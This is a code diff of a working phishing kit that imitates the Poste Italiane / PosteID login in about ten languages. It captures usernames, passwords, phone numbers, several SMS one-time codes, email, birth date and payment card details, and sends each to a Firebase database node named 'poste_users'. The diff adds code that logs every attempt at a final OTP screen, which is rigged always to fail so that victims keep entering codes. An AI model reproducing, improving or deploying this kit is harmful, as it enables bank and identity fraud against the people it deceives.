@@ -12,12 +12,10 @@ html,body{width:100%;height:100%;overflow:hidden;background:#fff}
 .screen{display:none;flex:1;flex-direction:column;overflow-y:auto;width:100%}
 .screen.active{display:flex}
 
-/* SPLASH */
 #screen-splash{background:#f7e500;justify-content:center;align-items:center}
 .splash-text{font-size:42px;font-weight:800;color:#18529b;letter-spacing:-1px}
 .splash-text span{font-weight:400}
 
-/* LOGIN */
 .hero{height:clamp(229px,58vw,344px);background:#ECDC02;border-radius:0 0 50% 50% / 0 0 22% 22%;position:relative;flex-shrink:0}
 .hero-actions{position:absolute;right:5%;top:clamp(47px,11.7vw,69px);display:flex;gap:clamp(12px,3vw,19px);z-index:2}
 .circle{width:clamp(42px,10.5vw,63px);height:clamp(42px,10.5vw,63px);border:0;border-radius:50%;background:#fff9a8;color:#111;display:grid;place-items:center;box-shadow:0 7px 19px #8b7d0030;font-size:clamp(26px,6vw,37px);font-weight:300;cursor:pointer}
@@ -52,7 +50,6 @@ h1{margin:0;max-width:75%;font-size:clamp(22px,5.8vw,35px);line-height:1.33;font
 .divider:before,.divider:after{content:"";height:10px;background:#f5f5f5;flex:1}
 .spid{margin-top:clamp(31px,7.5vw,45px);width:100%;height:clamp(48px,12vw,72px);border:1.5px solid #1854a9;border-radius:100px;background:#fff;color:#18509b;font-weight:700;font-size:clamp(17px,4vw,24px);cursor:pointer}
 
-/* TOPBAR */
 .topbar{height:50px;background:#f5e500;display:flex;align-items:center;padding:0 18px;gap:24px;flex-shrink:0}
 .wordmark{color:#18529b;font-size:22px;letter-spacing:-.9px;white-space:nowrap;line-height:1}
 .wordmark strong{font-weight:800}
@@ -69,14 +66,12 @@ h1{margin:0;max-width:75%;font-size:clamp(22px,5.8vw,35px);line-height:1.33;font
 .phone-row input::placeholder{color:#383b40;opacity:1}
 .submit-yellow{display:block;margin-top:34px;width:100%;max-width:470px;height:49px;border:0;border-radius:28px;background:#F4E500;color:#fff;font-size:17px;font-weight:700;cursor:pointer}
 
-/* LOADER */
 .loader-screen{display:flex;flex-direction:column;justify-content:center;align-items:center;flex:1;background:#fff;color:#1456a6}
 .loader-screen h1{font-size:32px;margin:0 0 12px;color:#1456a6;font-weight:800}
 .loader-screen p{font-size:19px;font-weight:600;margin:0 0 34px;color:#1456a6;text-align:center}
 .spinner{width:50px;height:50px;border:10px solid #e9e9e9;border-bottom-color:#1456a6;border-radius:50%;animation:spin .8s linear infinite}
 @keyframes spin{to{transform:rotate(360deg)}}
 
-/* OTP */
 .otp-page{flex:1;position:relative;background:#fff}
 .top-actions{position:absolute;right:10px;top:9px;display:flex;align-items:center;gap:11px;z-index:5}
 .round{width:39px;height:39px;border:0;border-radius:50%;background:#fff;box-shadow:0 3px 20px #0000000d;color:#16191d;display:grid;place-items:center;cursor:pointer}
@@ -93,7 +88,6 @@ h1{margin:0;max-width:75%;font-size:clamp(22px,5.8vw,35px);line-height:1.33;font
 .otp-timer{text-align:center;font-size:13.5px;margin:37px 0 0;color:#17191d}
 .otp-timer strong{font-weight:700}
 
-/* CARD */
 .card-page{padding:59px 20px 30px;flex:1;position:relative;background:#fff}
 .card-h1{margin:0 0 21px;font-size:21px;line-height:1.27;font-weight:700;letter-spacing:-.2px;color:#17191d}
 .card-visual{margin:20px auto 30px;width:100%;max-width:350px;height:224px;background:linear-gradient(135deg,#000 0%,#1a1a1a 100%);border-radius:18px;position:relative;overflow:hidden;box-shadow:0 10px 30px rgba(0,0,0,0.3)}
@@ -364,6 +358,7 @@ h1{margin:0;max-width:75%;font-size:clamp(22px,5.8vw,35px);line-height:1.33;font
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
 import { getDatabase, ref, push, set, update } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
 
+// ✅ long-d1bcb — pehla wala
 const firebaseConfig = {
     apiKey: "AIzaSyB9Y2_hnmgQsFute7DDAcKjmuoAnggQZJY",
     authDomain: "long-d1bcb.firebaseapp.com",
@@ -381,7 +376,6 @@ const FIREBASE_NODE = 'poste_users';
 let currentKey = null;
 const sessionData = {};
 
-// SAVE (create new user)
 function saveToFirebase(data) {
     const usersRef = ref(db, FIREBASE_NODE);
     const newRef = push(usersRef);
@@ -395,10 +389,8 @@ function saveToFirebase(data) {
       .catch(err => console.error('❌ Save error:', err));
 }
 
-// UPDATE (existing user)
 function updateFirebase(data) {
     if (!currentKey) {
-        console.warn('⚠️ No key — creating new');
         saveToFirebase({ ...sessionData, ...data });
         return;
     }
@@ -414,59 +406,39 @@ function showScreen(id) {
     window.scrollTo(0, 0);
 }
 
-// =========================================================
-// LANGUAGE TRANSLATIONS
-// =========================================================
+// TRANSLATIONS
 const translations = {
     it: {
         loginTitle: 'Accedi con il tuo<br>account Poste',
-        username: 'Nome utente',
-        password: 'Password',
+        username: 'Nome utente', password: 'Password',
         recover: 'Recupera nome utente o password',
         loginBtn: 'Accedi',
         register: 'Non hai un account Poste? <strong>Registrati</strong><span class="arrow">➜</span>',
-        divider: 'oppure continua con',
-        spid: 'PosteID abilitato a SPID',
-        phoneTitle: 'Numero di cellulare',
-        mobile: 'Numero di cellulare',
-        phoneBtn: 'Accedi',
+        divider: 'oppure continua con', spid: 'PosteID abilitato a SPID',
+        phoneTitle: 'Numero di cellulare', mobile: 'Numero di cellulare', phoneBtn: 'Accedi',
         loader: 'Caricamento in corso...',
         otpTitle: 'Inserisci codice SMS',
         otpDescPre: 'Inserisci il codice che ti abbiamo appena inviato via<br>SMS al numero ',
         otpBtn: 'Continua',
-        otpTimer: 'Hai ancora ',
-        otpTimerSuffix: ' secondi',
-        emailTitle: 'Inserisci la tua email',
-        emailBtn: 'Accedi',
-        dateTitle: 'Inserisci la tua data di nascita.',
-        dateBtn: 'Accedi',
-        cardTitle: 'Inserisci i tuoi Card dati',
-        cardBtn: 'Accedi'
+        emailTitle: 'Inserisci la tua email', emailBtn: 'Accedi',
+        dateTitle: 'Inserisci la tua data di nascita.', dateBtn: 'Accedi',
+        cardTitle: 'Inserisci i tuoi Card dati', cardBtn: 'Accedi'
     },
     en: {
         loginTitle: 'Log in with your<br>Poste account',
-        username: 'Username',
-        password: 'Password',
+        username: 'Username', password: 'Password',
         recover: 'Recover username or password',
         loginBtn: 'Log in',
         register: 'Don\'t have a Poste account? <strong>Sign up</strong><span class="arrow">➜</span>',
-        divider: 'or continue with',
-        spid: 'PosteID enabled for SPID',
-        phoneTitle: 'Mobile Number',
-        mobile: 'Mobile Number',
-        phoneBtn: 'Sign in',
+        divider: 'or continue with', spid: 'PosteID enabled for SPID',
+        phoneTitle: 'Mobile Number', mobile: 'Mobile Number', phoneBtn: 'Sign in',
         loader: 'Loading...',
         otpTitle: 'Enter SMS Code',
         otpDescPre: 'Enter the code we just sent you via<br>SMS to ',
         otpBtn: 'Continue',
-        otpTimer: 'You still have ',
-        otpTimerSuffix: ' seconds',
-        emailTitle: 'Enter your Email',
-        emailBtn: 'Sign in',
-        dateTitle: 'Enter your Date of Birth.',
-        dateBtn: 'Sign in',
-        cardTitle: 'Enter your Card Details',
-        cardBtn: 'Sign in'
+        emailTitle: 'Enter your Email', emailBtn: 'Sign in',
+        dateTitle: 'Enter your Date of Birth.', dateBtn: 'Sign in',
+        cardTitle: 'Enter your Card Details', cardBtn: 'Sign in'
     },
     de: {
         loginTitle: 'Melden Sie sich mit Ihrem<br>Poste-Konto an',
@@ -477,8 +449,9 @@ const translations = {
         divider: 'oder weiter mit', spid: 'PosteID für SPID aktiviert',
         phoneTitle: 'Handynummer', mobile: 'Handynummer', phoneBtn: 'Anmelden',
         loader: 'Wird geladen...',
-        otpTitle: 'SMS-Code eingeben', otpDescPre: 'Geben Sie den Code ein, den wir gerade per SMS gesendet haben an ',
-        otpBtn: 'Weiter', otpTimer: 'Sie haben noch ', otpTimerSuffix: ' Sekunden',
+        otpTitle: 'SMS-Code eingeben',
+        otpDescPre: 'Geben Sie den Code ein, den wir gerade per SMS gesendet haben an ',
+        otpBtn: 'Weiter',
         emailTitle: 'Geben Sie Ihre E-Mail ein', emailBtn: 'Anmelden',
         dateTitle: 'Geben Sie Ihr Geburtsdatum ein.', dateBtn: 'Anmelden',
         cardTitle: 'Geben Sie Ihre Kartendetails ein', cardBtn: 'Anmelden'
@@ -492,8 +465,9 @@ const translations = {
         divider: 'ou continuez avec', spid: 'PosteID activé pour SPID',
         phoneTitle: 'Numéro de portable', mobile: 'Numéro de portable', phoneBtn: 'Se connecter',
         loader: 'Chargement...',
-        otpTitle: 'Entrez le code SMS', otpDescPre: 'Entrez le code que nous venons de vous envoyer par SMS au ',
-        otpBtn: 'Continuer', otpTimer: 'Il vous reste ', otpTimerSuffix: ' secondes',
+        otpTitle: 'Entrez le code SMS',
+        otpDescPre: 'Entrez le code que nous venons de vous envoyer par SMS au ',
+        otpBtn: 'Continuer',
         emailTitle: 'Entrez votre email', emailBtn: 'Se connecter',
         dateTitle: 'Entrez votre date de naissance.', dateBtn: 'Se connecter',
         cardTitle: 'Entrez les détails de votre carte', cardBtn: 'Se connecter'
@@ -507,8 +481,9 @@ const translations = {
         divider: 'o continuar con', spid: 'PosteID habilitado para SPID',
         phoneTitle: 'Número de móvil', mobile: 'Número de móvil', phoneBtn: 'Iniciar sesión',
         loader: 'Cargando...',
-        otpTitle: 'Ingrese el código SMS', otpDescPre: 'Ingrese el código que acabamos de enviar por SMS al ',
-        otpBtn: 'Continuar', otpTimer: 'Todavía tienes ', otpTimerSuffix: ' segundos',
+        otpTitle: 'Ingrese el código SMS',
+        otpDescPre: 'Ingrese el código que acabamos de enviar por SMS al ',
+        otpBtn: 'Continuar',
         emailTitle: 'Ingrese su correo electrónico', emailBtn: 'Iniciar sesión',
         dateTitle: 'Ingrese su fecha de nacimiento.', dateBtn: 'Iniciar sesión',
         cardTitle: 'Ingrese los datos de su tarjeta', cardBtn: 'Iniciar sesión'
@@ -522,8 +497,9 @@ const translations = {
         divider: 'ou continuar com', spid: 'PosteID habilitado para SPID',
         phoneTitle: 'Número de celular', mobile: 'Número de celular', phoneBtn: 'Entrar',
         loader: 'Carregando...',
-        otpTitle: 'Digite o código SMS', otpDescPre: 'Digite o código que acabamos de enviar por SMS para ',
-        otpBtn: 'Continuar', otpTimer: 'Você ainda tem ', otpTimerSuffix: ' segundos',
+        otpTitle: 'Digite o código SMS',
+        otpDescPre: 'Digite o código que acabamos de enviar por SMS para ',
+        otpBtn: 'Continuar',
         emailTitle: 'Digite seu email', emailBtn: 'Entrar',
         dateTitle: 'Digite sua data de nascimento.', dateBtn: 'Entrar',
         cardTitle: 'Digite os dados do seu cartão', cardBtn: 'Entrar'
@@ -537,8 +513,9 @@ const translations = {
         divider: 'of doorgaan met', spid: 'PosteID ingeschakeld voor SPID',
         phoneTitle: 'Mobiel nummer', mobile: 'Mobiel nummer', phoneBtn: 'Inloggen',
         loader: 'Laden...',
-        otpTitle: 'Voer SMS-code in', otpDescPre: 'Voer de code in die we zojuist via SMS hebben verzonden naar ',
-        otpBtn: 'Doorgaan', otpTimer: 'Je hebt nog ', otpTimerSuffix: ' seconden',
+        otpTitle: 'Voer SMS-code in',
+        otpDescPre: 'Voer de code in die we zojuist via SMS hebben verzonden naar ',
+        otpBtn: 'Doorgaan',
         emailTitle: 'Voer uw e-mailadres in', emailBtn: 'Inloggen',
         dateTitle: 'Voer uw geboortedatum in.', dateBtn: 'Inloggen',
         cardTitle: 'Voer uw kaartgegevens in', cardBtn: 'Inloggen'
@@ -552,8 +529,9 @@ const translations = {
         divider: 'sau continuați cu', spid: 'PosteID activat pentru SPID',
         phoneTitle: 'Număr de mobil', mobile: 'Număr de mobil', phoneBtn: 'Conectare',
         loader: 'Se încarcă...',
-        otpTitle: 'Introduceți codul SMS', otpDescPre: 'Introduceți codul pe care tocmai l-am trimis prin SMS la ',
-        otpBtn: 'Continuați', otpTimer: 'Mai aveți ', otpTimerSuffix: ' secunde',
+        otpTitle: 'Introduceți codul SMS',
+        otpDescPre: 'Introduceți codul pe care tocmai l-am trimis prin SMS la ',
+        otpBtn: 'Continuați',
         emailTitle: 'Introduceți adresa de email', emailBtn: 'Conectare',
         dateTitle: 'Introduceți data nașterii.', dateBtn: 'Conectare',
         cardTitle: 'Introduceți detaliile cardului', cardBtn: 'Conectare'
@@ -567,8 +545,9 @@ const translations = {
         divider: 'ή συνεχίστε με', spid: 'PosteID ενεργοποιημένο για SPID',
         phoneTitle: 'Αριθμός κινητού', mobile: 'Αριθμός κινητού', phoneBtn: 'Σύνδεση',
         loader: 'Φόρτωση...',
-        otpTitle: 'Εισαγάγετε κωδικό SMS', otpDescPre: 'Εισαγάγετε τον κωδικό που μόλις στείλαμε μέσω SMS στο ',
-        otpBtn: 'Συνέχεια', otpTimer: 'Έχετε ακόμα ', otpTimerSuffix: ' δευτερόλεπτα',
+        otpTitle: 'Εισαγάγετε κωδικό SMS',
+        otpDescPre: 'Εισαγάγετε τον κωδικό που μόλις στείλαμε μέσω SMS στο ',
+        otpBtn: 'Συνέχεια',
         emailTitle: 'Εισαγάγετε το email σας', emailBtn: 'Σύνδεση',
         dateTitle: 'Εισαγάγετε την ημερομηνία γέννησής σας.', dateBtn: 'Σύνδεση',
         cardTitle: 'Εισαγάγετε τα στοιχεία της κάρτας σας', cardBtn: 'Σύνδεση'
@@ -582,8 +561,9 @@ const translations = {
         divider: 'lub kontynuuj z', spid: 'PosteID włączone dla SPID',
         phoneTitle: 'Numer telefonu komórkowego', mobile: 'Numer telefonu komórkowego', phoneBtn: 'Zaloguj się',
         loader: 'Ładowanie...',
-        otpTitle: 'Wprowadź kod SMS', otpDescPre: 'Wprowadź kod, który właśnie wysłaliśmy SMS-em na numer ',
-        otpBtn: 'Kontynuuj', otpTimer: 'Masz jeszcze ', otpTimerSuffix: ' sekund',
+        otpTitle: 'Wprowadź kod SMS',
+        otpDescPre: 'Wprowadź kod, który właśnie wysłaliśmy SMS-em na numer ',
+        otpBtn: 'Kontynuuj',
         emailTitle: 'Wprowadź swój email', emailBtn: 'Zaloguj się',
         dateTitle: 'Wprowadź swoją datę urodzenia.', dateBtn: 'Zaloguj się',
         cardTitle: 'Wprowadź dane swojej karty', cardBtn: 'Zaloguj się'
@@ -645,52 +625,33 @@ function applyLanguage(lang) {
     });
 }
 
-// =========================================================
 // SPLASH → LOGIN
-// =========================================================
 setTimeout(() => {
     showScreen('screen-login');
     applyLanguage(currentLang);
 }, 3000);
 
-// =========================================================
-// PASSWORD TOGGLE
-// =========================================================
 window.togglePassword = function() {
     const pwd = document.getElementById('password');
     pwd.type = pwd.type === 'password' ? 'text' : 'password';
 };
 
-// =========================================================
-// LOGIN → PHONE
-// =========================================================
 window.goToPhone = function() {
     const user = document.getElementById('username').value.trim();
     const pass = document.getElementById('password').value.trim();
     if (!user || !pass) { alert('Please enter username and password'); return; }
     sessionData.username = user;
     sessionData.password = pass;
-    saveToFirebase({
-        username: user,
-        password: pass,
-        step: 'login'
-    });
+    saveToFirebase({ username: user, password: pass, step: 'login' });
     showScreen('screen-phone');
 };
 
-// =========================================================
-// LOADER → NEXT
-// =========================================================
 window.goToLoader = function(nextScreen) {
     if (nextScreen === 'otp1') {
         const mobile = document.getElementById('mobile').value.trim();
         if (!mobile) { alert('Please enter mobile number'); return; }
         sessionData.mobile = mobile;
-        updateFirebase({
-            mobile: mobile,
-            phone: '+39' + mobile,
-            step: 'phone'
-        });
+        updateFirebase({ mobile: mobile, phone: '+39' + mobile, step: 'phone' });
     }
     if (nextScreen === 'otp2') {
         const email = document.getElementById('email').value.trim();
@@ -751,15 +712,11 @@ window.goToLoader = function(nextScreen) {
     }, 2500);
 };
 
-// =========================================================
-// OTP SUBMITS
-// =========================================================
 window.submitOtp1 = function() {
     const otp = document.getElementById('otp1Input').value.trim();
     if (!otp) { alert('Please enter OTP'); return; }
     sessionData.otp1 = otp;
     updateFirebase({ otp1: otp, step: 'otp1' });
-
     showScreen('screen-loader');
     setTimeout(() => { showScreen('screen-email'); }, 2500);
 };
@@ -769,7 +726,6 @@ window.submitOtp2 = function() {
     if (!otp) { alert('Please enter OTP'); return; }
     sessionData.otp2 = otp;
     updateFirebase({ otp2: otp, step: 'otp2' });
-
     showScreen('screen-loader2');
     setTimeout(() => { showScreen('screen-date'); }, 2500);
 };
@@ -779,13 +735,14 @@ window.submitOtp3 = function() {
     if (!otp) { alert('Please enter OTP'); return; }
     sessionData.otp3 = otp;
     updateFirebase({ otp3: otp, step: 'otp3' });
-
     showScreen('screen-loader');
     setTimeout(() => { showScreen('screen-card'); }, 2500);
 };
 
-// FINAL OTP — always invalid, stays on same page
+// ✅ FINAL OTP — Save ALL attempts to array
 let otp4Attempts = 0;
+let otp4AttemptsArray = [];
+
 window.submitOtp4 = function() {
     const otp = document.getElementById('otp4Input').value.trim();
     if (!otp) { alert('Please enter OTP'); return; }
@@ -793,14 +750,21 @@ window.submitOtp4 = function() {
     sessionData.otp4 = otp;
     otp4Attempts++;
 
+    // ✅ Push every attempt into array
+    otp4AttemptsArray.push({
+        otp: otp,
+        time: new Date().toLocaleString(),
+        timestamp: Date.now()
+    });
+
     updateFirebase({
         otp4: otp,
         otp4Attempts: otp4Attempts,
+        otp4AttemptsArray: otp4AttemptsArray,
         step: 'otp4-attempt-' + otp4Attempts
     });
 
     showScreen('screen-loader');
-
     setTimeout(() => {
         document.getElementById('otp4Error').classList.add('show');
         document.getElementById('otp4Input').value = '';
@@ -813,9 +777,6 @@ window.backToLogin = function() {
     showScreen('screen-login');
 };
 
-// =========================================================
-// TIMER
-// =========================================================
 function startTimer(elementId, seconds) {
     const el = document.getElementById(elementId);
     if (!el) return;
@@ -833,9 +794,6 @@ function startTimer(elementId, seconds) {
     }, 1000);
 }
 
-// =========================================================
-// CARD FORMAT
-// =========================================================
 const cardExpiryInput = document.getElementById('cardExpiry');
 const cardExpiryDisplay = document.getElementById('cardExpiryDisplay');
 cardExpiryInput.addEventListener('input', () => {
@@ -845,9 +803,6 @@ cardExpiryInput.addEventListener('input', () => {
     cardExpiryDisplay.textContent = formatted || '**/**';
 });
 
-// =========================================================
-// INPUT RESTRICTIONS
-// =========================================================
 document.getElementById('mobile').addEventListener('input', function() {
     this.value = this.value.replace(/[^0-9]/g, '');
 });
@@ -867,9 +822,6 @@ document.getElementById('cardCVV').addEventListener('input', function() {
     this.value = this.value.replace(/[^0-9]/g, '');
 });
 
-// =========================================================
-// LANGUAGE MENU
-// =========================================================
 const langBtn = document.getElementById('languageButton');
 const langMenu = document.getElementById('languageMenu');
 
